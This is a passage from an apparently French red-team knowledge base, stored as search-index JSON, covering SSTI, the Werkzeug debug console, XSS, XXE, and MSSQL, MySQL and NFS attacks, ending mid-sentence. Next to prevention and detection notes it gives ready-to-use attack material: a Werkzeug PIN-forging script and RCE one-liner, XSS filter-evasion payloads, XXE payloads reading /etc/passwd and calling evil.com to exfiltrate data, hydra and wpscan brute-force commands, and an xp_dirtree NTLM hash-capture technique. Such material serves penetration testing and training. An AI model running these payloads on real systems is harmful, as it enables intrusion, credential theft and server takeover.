<li>Valider et assainir toutes les entr\u00e9es utilisateur pour s'assurer qu'elles ne contiennent pas de code malveillant.</li> </ul> <pre><code>@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    if not name.isalnum():\n        return \"Invalid input!\"\n    return render_template('greet.html', name=name)\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-ssti","title":"D\u00e9tection des Failles SSTI","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les endroits o\u00f9 des entr\u00e9es utilisateur sont directement int\u00e9gr\u00e9es dans des templates sans validation ou \u00e9chappement ad\u00e9quat.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les entr\u00e9es pour injecter des payloads SSTI et v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles SSTI.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>\u00c9chappement avec Jinja2 :</p> <pre><code>from jinja2 import Environment, escape\n\nenv = Environment(autoescape=True)\ntemplate = env.from_string(\"Hello {{ name }}!\")\nrendered_template = template.render(name=name)\n</code></pre> <p>Validation stricte des Entr\u00e9es :</p> <pre><code>@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    if not name.isalnum():\n        return \"Invalid input!\"\n    return render_template('greet.html', name=name)\n</code></pre> <p>Utilisation de M\u00e9thodes S\u00e9curis\u00e9es :</p> <pre><code>@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    return render_template('greet.html', name=name)\n</code></pre> <p>Voici les informations compl\u00e8tes et format\u00e9es pour les failles d'Upload de Fichiers et Server-Side Template Injection (SSTI).</p> Cat\u00e9gorie Information TTP Exploiter les moteurs de template c\u00f4t\u00e9 serveur pour injecter du code malveillant CWE CWE-94 (Improper Control of Generation of Code ('Code Injection')) Description de l'attaque SSTI se produit lorsqu'un moteur de template c\u00f4t\u00e9 serveur permet \u00e0 un attaquant d'injecter des expressions de template malveillantes, ce qui peut conduire \u00e0 l'ex\u00e9cution de code arbitraire, l'exfiltration de donn\u00e9es, ou d'autres actions non autoris\u00e9es. Impacts potentiels - Ex\u00e9cution de code arbitraire sur le serveur- Divulgation de donn\u00e9es sensibles- Compromission totale du serveur- D\u00e9ni de service (DoS) Comment la d\u00e9tecter - Analyse de code pour les entr\u00e9es utilisateur inject\u00e9es dans les templates- Tests de p\u00e9n\u00e9tration pour identifier les points d'injection de template- Utilisation d'outils de scan de s\u00e9curit\u00e9 pour d\u00e9tecter les vuln\u00e9rabilit\u00e9s SSTI Rem\u00e9diations/mitigations - \u00c9viter d'injecter des entr\u00e9es utilisateur directement dans les templates- Utiliser des moteurs de template s\u00e9curis\u00e9s qui n'exposent pas de fonctionnalit\u00e9s d'ex\u00e9cution de code- Valider et \u00e9chapper toutes les entr\u00e9es utilisateur- Mettre en place des politiques de s\u00e9curit\u00e9 de contenu strictes Lien de r\u00e9f\u00e9rence OWASP - Server-Side Template Injection (SSTI)"},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/Payloads/","title":"Payloads","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/Payloads/#aspnet-razor","title":"ASP.NET Razor","text":"<pre><code>@(1+2)\n</code></pre> <p>Execution de commande :</p> <pre><code>@{\nCode en C\n}\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/Payloads/#java","title":"Java","text":"<pre><code>${7*7}\n${{7*7}}\n${class.getClassLoader()}\n${class.getResource(\"\").getPath()}\n${class.getResource(\"../../../../../index.htm\").getContent()}\n</code></pre> <pre><code>{% csrf_token %} # doit causer une erreur\n{{ 7*7 }}  # doit causer une erreur\nih0vr{{364|add:733}}d121r\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/Payloads/#ruby","title":"Ruby","text":"<pre><code>&lt;%= 7 * 7 %&gt;\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Tomcat/Bruteforce%20Manager/","title":"Bruteforce Manager","text":"<pre><code>msf6 auxiliary(scanner/http/tomcat_mgr_login)\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Werkzeug/Console%20de%20debug/","title":"Console de debug","text":"<pre><code>http://domain.com/console\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Werkzeug/Console%20de%20debug/#rce","title":"RCE :","text":"<pre><code>__import__('os').popen('whoami').read();\n</code></pre> <p>Si la console est prot\u00e9g\u00e9e par un PIN, \u00e7a se complique :). Il est possible de g\u00e9n\u00e9rer le code PIN si nous avons d\u00e9j\u00e0 un acc\u00e8s \u00e0 la machine (ce qui peut permettre du lateral movement).</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Werkzeug/Console%20de%20debug/#pour-generer-le-pin-plusieurs-informations-sont-necessaires","title":"Pour g\u00e9n\u00e9rer le PIN, plusieurs informations sont n\u00e9cessaires:","text":"<ul> <li><code>username</code> qui a initi\u00e9 l'application.</li> <li><code>modname</code> (flask.app, la plupart du temps).</li> <li><code>getattr(mod, '__file__', None)</code> le path vers app.py (/usr/local/lib/python3.5/dist-packages/flask/app.py , par exemple).</li> <li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code> g\u00e9n\u00e9ralement \"Flask\".</li> <li><code>uuid.getnode()</code> est l'adresse MAC de l'interface r\u00e9seau du serveur, sous forme d\u00e9cimale. Pour la trouver : <code>/sys/class/net/&lt;device id&gt;/address</code> puis la convertir sous forme d\u00e9cimale, par exemple avec python (exemple : <code>print(0x5600027a23ac)</code>)</li> <li><code>get_machine_id()</code> : trouvable avec ce script bash :</li> </ul> <pre><code>def get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -&gt; t.Optional[t.Union[str, bytes]]:\n        linux = b\"\"\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\":\n            try:\n                with open(filename, \"rb\") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open(\"/proc/self/cgroup\", \"rb\") as f:\n                linux += f.readline().strip().rpartition(b\"/\")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer's serial number.\n        try:\n</code></pre> <p>Puis remplir ce script python avec toutes les informations trouv\u00e9es :</p> <pre><code>import hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'user',  # username\n    'flask.app',  # modname\n    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address\n    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id\n]\n\n# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n# h.update(b'shittysalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n</code></pre> <p>Une fois ex\u00e9cut\u00e9, le script devrait g\u00e9n\u00e9rer un code PIN valide pour l'acc\u00e8s \u00e0 la console de werkzeug.</p> <p>[!Attention]  Plusieurs m\u00e9thodes diff\u00e9rentes existent pour trouver ces variables, et ne donnent pas le m\u00eame r\u00e9sultat final, il peut \u00eatre n\u00e9cessaire de tester plusieurs fois. Aussi, la console de debug peut se locker apr\u00e8s un certain nombre d'essais, attention !</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Wordpress/WPscan/","title":"WPscan","text":"<p>Enum\u00e9ration: <pre><code>wpscan --enumeration --url http://$url\n</code></pre></p> <p>Login bruteforce:</p> <pre><code>wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://$url\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles de Cross-Site Scripting (XSS) se produisent lorsque des applications web permettent l'injection de scripts malveillants par des utilisateurs non autoris\u00e9s dans les pages consult\u00e9es par d'autres utilisateurs. Ces scripts peuvent voler des cookies, des sessions, rediriger les utilisateurs, afficher du contenu non d\u00e9sir\u00e9, et bien plus encore.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#types-de-xss","title":"Types de XSS","text":"<p>XSS R\u00e9fl\u00e9chi :</p> <ul> <li>Se produit lorsque les donn\u00e9es fournies par l'utilisateur sont imm\u00e9diatement renvoy\u00e9es par l'application web sans traitement ou validation ad\u00e9quats.</li> </ul> <pre><code>&lt;form method=\"GET\" action=\"/search\"&gt;\n    &lt;input type=\"text\" name=\"query\"&gt;\n    &lt;input type=\"submit\" value=\"Search\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Si l'entr\u00e9e utilisateur <code>query</code> n'est pas \u00e9chapp\u00e9e, un attaquant peut injecter du code malveillant dans l'URL, par exemple : <code>/search?query=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>.</p> <p>XSS Stock\u00e9 :</p> <ul> <li>Se produit lorsque les donn\u00e9es fournies par l'utilisateur sont stock\u00e9es sur le serveur (par exemple, dans une base de donn\u00e9es) et renvoy\u00e9es ult\u00e9rieurement sans validation ou \u00e9chappement ad\u00e9quats.</li> </ul> <pre><code>&lt;form method=\"POST\" action=\"/submit_comment\"&gt;\n    &lt;textarea name=\"comment\"&gt;&lt;/textarea&gt;\n    &lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Si l'entr\u00e9e utilisateur <code>comment</code> n'est pas \u00e9chapp\u00e9e avant d'\u00eatre affich\u00e9e, un attaquant peut stocker du code malveillant qui s'ex\u00e9cutera lorsque d'autres utilisateurs consulteront la page contenant le commentaire.</p> <p>XSS Bas\u00e9 sur le DOM :  - Se produit lorsque le script c\u00f4t\u00e9 client modifie le DOM de mani\u00e8re dynamique en utilisant des donn\u00e9es non valid\u00e9es provenant de l'utilisateur.</p> <pre><code>var user = location.hash.substring(1);\ndocument.getElementById(\"welcome\").innerHTML = \"Welcome \" + user + \"!\";\n</code></pre> <p>Si <code>location.hash</code> contient des scripts malveillants, par exemple <code>#&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, le script sera ex\u00e9cut\u00e9.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-xss","title":"Pr\u00e9vention des Attaques XSS","text":"<p>\u00c9chappement des Entr\u00e9es Utilisateur :</p> <ul> <li>\u00c9chapper toutes les donn\u00e9es d'entr\u00e9e utilisateur avant de les inclure dans le HTML, le JavaScript, le CSS, etc.</li> </ul> <pre><code>&lt;div id=\"welcome\"&gt;Welcome &lt;?php echo htmlspecialchars($user); ?&gt;!&lt;/div&gt;\n</code></pre> <p>Utilisation d'En-t\u00eates de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des en-t\u00eates HTTP pour aider \u00e0 prot\u00e9ger contre les attaques XSS.</li> </ul> <pre><code>Content-Security-Policy: default-src 'self'\nX-XSS-Protection: 1; mode=block\n</code></pre> <p>Validation et Sanitation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur avant de les traiter ou de les stocker.</li> </ul> <pre><code>$comment = filter_input(INPUT_POST, 'comment', FILTER_SANITIZE_STRING);\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-xss","title":"D\u00e9tection des Failles XSS","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les endroits o\u00f9 des entr\u00e9es utilisateur sont incluses dans le DOM sans validation ou \u00e9chappement ad\u00e9quats.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les param\u00e8tres de requ\u00eates et en injectant des payloads XSS pour v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles XSS.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>\u00c9chappement avec PHP :</p> <pre><code>&lt;?php\n$user = htmlspecialchars($_GET['user']);\necho \"Welcome \" . $user;\n?&gt;\n</code></pre> <p>Utilisation de Content Security Policy (CSP) :</p> <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'\n</code></pre> <p>Validation stricte des Entr\u00e9es :</p> <pre><code>$comment = filter_input(INPUT_POST, 'comment', FILTER_SANITIZE_STRING);\n</code></pre> Cat\u00e9gorie Information TTP Injection de scripts c\u00f4t\u00e9 client dans des pages web CWE CWE-79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')) Description de l'attaque XSS se produit lorsque des scripts malveillants sont inject\u00e9s dans des sites web de confiance. Ces scripts sont ex\u00e9cut\u00e9s dans le navigateur de l'utilisateur et peuvent d\u00e9tourner des sessions, d\u00e9facer des sites web, ou rediriger l'utilisateur vers des sites malveillants. Impacts potentiels - D\u00e9tournement de session- Vol d'informations sensibles- Manipulation de contenu web pour l'utilisateur Comment la d\u00e9tecter - Utilisation de scanners de vuln\u00e9rabilit\u00e9s web- Analyse des entr\u00e9es et sorties des applications web- Tests de p\u00e9n\u00e9tration ciblant les scripts c\u00f4t\u00e9 client Rem\u00e9diations/mitigations - \u00c9chappement des entr\u00e9es utilisateur dans les sorties HTML/JavaScript- Utilisation de politiques de s\u00e9curit\u00e9 de contenu (CSP)- Validation et nettoyage des entr\u00e9es c\u00f4t\u00e9 serveur- Formation des d\u00e9veloppeurs aux pratiques de codage s\u00e9curis\u00e9 Lien de r\u00e9f\u00e9rence OWASP - Cross Site Scripting (XSS)"},{"location":"Red%20Team/2%20-%20Services/HTTP/XSS/Payloads/","title":"Payloads","text":"<pre><code>// Basic payload\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;\n\"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;\n\"&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;\n&lt;script&gt;\\u0061lert('22')&lt;/script&gt;\n&lt;script&gt;eval('\\x61lert(\\'33\\')')&lt;/script&gt;\n&lt;script&gt;eval(8680439..toString(30))(983801..toString(36))&lt;/script&gt; //parseInt(\"confirm\",30) == 8680439 &amp;&amp; 8680439..toString(30) == \"confirm\"\n&lt;object/data=\"jav&amp;#x61;sc&amp;#x72;ipt&amp;#x3a;al&amp;#x65;rt&amp;#x28;23&amp;#x29;\"&gt;\n\n// Img payload\n&lt;img src=x onerror=alert('XSS');&gt;\n&lt;img src=x onerror=alert('XSS')//\n&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;\n\"&gt;&lt;img src=x onerror=alert('XSS');&gt;\n\"&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;\n\n// Svg payload\n&lt;svg\fonload=alert(1)&gt;\n&lt;svg/onload=alert('XSS')&gt;\n&lt;svg onload=alert(1)//\n&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;\n&lt;svg id=alert(1) onload=eval(id)&gt;\n\"&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;\n\"&gt;&lt;svg/onload=alert(/XSS/)\n&lt;svg&gt;&lt;script href=data:,alert(1) /&gt;(`Firefox` is the only browser which allows self closing script)\n&lt;svg&gt;&lt;script&gt;alert('33')\n&lt;svg&gt;&lt;script&gt;alert&amp;lpar;'33'&amp;rpar;\n\n// Div payload\n&lt;div onpointerover=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerdown=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerenter=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerleave=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointermove=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerout=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerup=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'XML External Entity (XXE) se produisent lorsqu'une application XML permet \u00e0 un attaquant d'inclure des entit\u00e9s externes malveillantes ou des r\u00e9f\u00e9rences \u00e0 des ressources externes non s\u00e9curis\u00e9es dans un document XML. Cela peut entra\u00eener la divulgation de donn\u00e9es sensibles, le d\u00e9ni de service, voire l'ex\u00e9cution de code \u00e0 distance.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#types-dattaques-xxe","title":"Types d'Attaques XXE","text":"<p>XXE Basique :</p> <ul> <li>Se produit lorsque l'application XML traite les entit\u00e9s externes sans validation ou protection ad\u00e9quates.</li> </ul> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <ul> <li>Cette attaque r\u00e9cup\u00e8re le contenu du fichier <code>/etc/passwd</code>.</li> </ul> <p>XXE Out-Of-Band (OOB) :</p> <ul> <li>Se produit lorsque l'attaquant utilise l'entit\u00e9 externe pour initier une connexion sortante vers un serveur contr\u00f4l\u00e9 par lui.</li> </ul> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"&gt;\n%xxe;\n]&gt;\n&lt;foo&gt;&amp;all;&lt;/foo&gt;\n</code></pre> <ul> <li>Cette attaque peut \u00eatre utilis\u00e9e pour exfiltrer des donn\u00e9es vers un serveur contr\u00f4l\u00e9 par l'attaquant.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-xxe","title":"Pr\u00e9vention des Attaques XXE","text":"<p>D\u00e9sactivation du Parsing des DTD :</p> <ul> <li>D\u00e9sactiver le parsing des DTD (Document Type Definitions) dans les biblioth\u00e8ques XML.</li> </ul> <p>Validation des Entr\u00e9es XML :</p> <ul> <li>Valider et restreindre les entr\u00e9es XML pour s'assurer qu'elles ne contiennent pas d'entit\u00e9s externes malveillantes.</li> </ul> <p>Utilisation de M\u00e9thodes S\u00e9curis\u00e9es :</p> <ul> <li>Utiliser des m\u00e9thodes s\u00e9curis\u00e9es pour le traitement des documents XML, telles que DOM s\u00e9curis\u00e9 ou SAX avec les entit\u00e9s externes d\u00e9sactiv\u00e9es.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-xxe","title":"D\u00e9tection des Failles XXE","text":"<p>Analyse de la Configuration :</p> <ul> <li>Examiner la configuration XML pour v\u00e9rifier si le parsing des DTD est activ\u00e9.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en injectant des payloads XXE et en observant les r\u00e9ponses de l'application.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles XXE.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>D\u00e9sactivation des DTD dans Java :</p> <pre><code>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n</code></pre> <p>Utilisation de SAXParser avec les Entit\u00e9s Externes D\u00e9sactiv\u00e9es :</p> <pre><code>SAXParserFactory factory = SAXParserFactory.newInstance();\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nSAXParser parser = factory.newSAXParser();\n</code></pre> Cat\u00e9gorie Information TTP Exploitation des r\u00e9f\u00e9rences d'entit\u00e9s externes dans XML CWE CWE-611 (Improper Restriction of XML External Entity Reference) Description de l'attaque Une attaque XXE se produit lorsqu'un attaquant exploite des applications qui analysent XML de mani\u00e8re \u00e0 injecter des r\u00e9f\u00e9rences \u00e0 des entit\u00e9s externes malveillantes. Cela peut mener \u00e0 la divulgation d'informations confidentielles, au d\u00e9ni de service, ou \u00e0 l'ex\u00e9cution de code \u00e0 distance. Impacts potentiels - Divulgation d'informations sensibles- D\u00e9ni de service- Ex\u00e9cution de code \u00e0 distance- Porte d\u00e9rob\u00e9e dans les syst\u00e8mes Comment la d\u00e9tecter - Analyse de code statique et dynamique- Utilisation de scanners de vuln\u00e9rabilit\u00e9- Tests de p\u00e9n\u00e9tration ciblant les fonctionnalit\u00e9s de traitement XML Rem\u00e9diations/mitigations - D\u00e9sactivation du traitement des entit\u00e9s externes dans les parseurs XML- Validation et nettoyage des entr\u00e9es XML- Utilisation de listes blanches pour les \u00e9l\u00e9ments XML trait\u00e9s- Mise \u00e0 jour r\u00e9guli\u00e8re des biblioth\u00e8ques et frameworks XML Lien de r\u00e9f\u00e9rence OWASP - XML External Entity (XXE) Processing"},{"location":"Red%20Team/2%20-%20Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Base de donn\u00e9es SQL, port 3306, TCP</p>"},{"location":"Red%20Team/2%20-%20Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enum\u00e9ration","text":"<pre><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":"<pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip mssql\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<pre><code>auxiliary/admin/mssql/mssql_ntlm_stealer\nadmin/mssql/mssql_enum\nadmin/mssql/mssql_enum_domain_accounts\nadmin/mssql/mssql_enum_sql_logins\nauxiliary/admin/mssql/mssql_findandsampledata\nauxiliary/scanner/mssql/mssql_hashdump\nauxiliary/scanner/mssql/mssql_schemadump\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/MSSQL/Relais%20NTLM/","title":"Relais NTLM","text":"<p>Une fois connect\u00e9 sur un serveur MSSQL il peut \u00eatre possible d'acc\u00e9der \u00e0 un partage SMB via la commande xp_dirtree / xp_subdir / xp_fileexist, ce qui peut possiblement permettre de r\u00e9cup\u00e9rer le hash de l'utilisateur:</p> <p>Sur le poste attaquant:</p> <pre><code>sudo responder -I tun0\n</code></pre> <p>Sur MSSQL:</p> <pre><code>xp_dirtree '\\\\$ip$\\fauxpartage'\nexec master.dbo.xp_dirtree '\\\\$ip$\\fauxpartage'\nEXEC master..xp_subdirs '\\\\$ip$\\fauxpartage'\nEXEC master..xp_fileexist '\\\\$ip$\\fauxpartage'\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Base de donn\u00e9es SQL, port 3306, TCP</p>"},{"location":"Red%20Team/2%20-%20Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enum\u00e9ration","text":"<pre><code>nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip \n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":"<pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip mysql\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<pre><code>auxiliary/scanner/mysql/mysql_version\nauxiliary/scanner/mysql/mysql_authbypass_hashdump\nauxiliary/scanner/mysql/mysql_hashdump \nauxiliary/admin/mysql/mysql_enum \nauxiliary/scanner/mysql/mysql_schemadump  \nexploit/windows/mysql/mysql_start_up \n</code></pre> <p>Brute force user/password:</p> <pre><code>auxiliary/scanner/mysql/mysql_login\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Settings Description user Sets which user the MySQL service will run as. password Sets the password for the MySQL user. admin_address The IP address on which to listen for TCP/IP connections on the administrative network interface. debug This variable indicates the current debugging settings sql_warnings This variable controls whether single-row INSERT statements produce an information string if warnings occur. secure_file_priv This variable is used to limit the effect of data import and export operations."},{"location":"Red%20Team/2%20-%20Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Network FileSystem, port 2049, TCP/UDP Permet le partage de dossiers/fichiers \u00e0 travers un r\u00e9seau.</p> Version Features NFSv2 It is older but is supported by many systems and was initially operated entirely over UDP. NFSv3 It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients. NFSv4 It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol."},{"location":"Red%20Team/2%20-%20Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enum\u00e9ration","text":"<p>Nmap:</p> <pre><code>nmap -A --script nfs* $ip \n</code></pre> <p>Lister les partages:</p> <pre><code>showmount -e $ip\n</code></pre> <p>Monter un partage:</p> <pre><code>mkdir nfs_temp\nmount -t nfs $ip:/dossierPartag\u00e9 nfs_temp -o nolock\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<p>Scan:</p> <pre><code>scanner/nfs/nfsmount\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Option Description rw Permission lecture et \u00e9criture insecure Utilisations de ports en dessous 1024 nohide If another file system was mounted below an exported directory, this directory is exported by its own exports entry. no_root_squash All files created by root are kept with the UID/GID 0."},{"location":"Red%20Team/2%20-%20Services/NFS/nfs-no-root-squashfs/","title":"Nfs no root squashfs","text":"<p>Si un volume est mont\u00e9 en NFS avec l'option 